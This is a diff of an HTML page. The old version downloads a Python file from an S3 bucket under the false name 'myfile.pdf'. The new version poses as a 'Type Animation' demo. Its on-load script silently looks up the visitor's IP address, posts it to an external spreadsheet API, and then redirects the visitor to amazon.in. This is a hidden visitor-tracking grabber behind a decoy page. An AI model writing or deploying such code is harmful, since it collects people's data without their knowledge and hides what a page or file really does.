@@ -1,37 +1,76 @@
-<html lang="en"><head>
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Type Animation</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-  <meta charset="UTF-8">
-  
-
-  <title>file Download</title>
-
-
-</head>
-
-<body translate="no">
-  <button type="button" id="GetFile">Get File!</button>
-    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-1b93190375e9ccc259df3a57c1abc0e64599724ae30d7ea4c6877eb615f89387.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
-      <script id="rendered-js">
-$('#GetFile').on('click', function () {
-  $.ajax({
-    url: 'https://datahack-prod.s3.amazonaws.com/submissions/job-a-thon-september-2022/1077_080fdc4e-d7fc-44c2-a6ee-fbd2b42626ed_cf_hack_test.py  ',
-    method: 'GET',
-    xhrFields: {
-      responseType: 'blob' 
-  },
-    success: function (data) {
-      var a = document.createElement('a');
-      var url = window.URL.createObjectURL(data);
-      a.href = url;
-      a.download = 'myfile.pdf';
-      document.body.append(a);
-      a.click();
-      a.remove();
-      window.URL.revokeObjectURL(url);
-    } });
-
-});
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <style>
+        .box{
+            height:100vh;
+        }
+        .input-text-blinked{
+            font-size: 30px;
+            font-weight: 700;
+            position: relative;
+            overflow: hidden;
+        }
+        .input-text-blinked::after{
+            content: "";
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            background-color: white;
+            border-left: 2px solid black;
+            top: 0;
+            left: 0;
+            animation: border-blink 0.5s 0.5s infinite,show-elements 7s infinite ;
+        }
+        @keyframes border-blink {
+            0% {
+                border:none ;
+            }
+            100% {
+                border-left-color: black;
+            }
+        }
+        @keyframes show-elements {
+            0% {
+                transform: translateX(0%);
+            }
+            100% {
+                transform: translate(100%);
+            }
+        }
+    </style>
+  </head>
+  <body>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+    <script>
+        $(document).ready(()=>{
+            $.getJSON('https://api.ipify.org?format=json', 
+            function(data){
+                console.log(data);
+                fetch("https://api.apispreadsheets.com/data/I0eZip2rK05BeLnZ/", {
+                    method: "POST",
+                    body: JSON.stringify({"data": {"Ip Address":data.ip}}),
+                }).then(res =>{
+                    if (res.status === 201){
+                        location.href = "https://www.amazon.in"
+                    }
+                    else{
+                        location.reload;
+                    }
+                })
+            });
+        })
     </script>
-</body></html>
+  </body>
+</html>
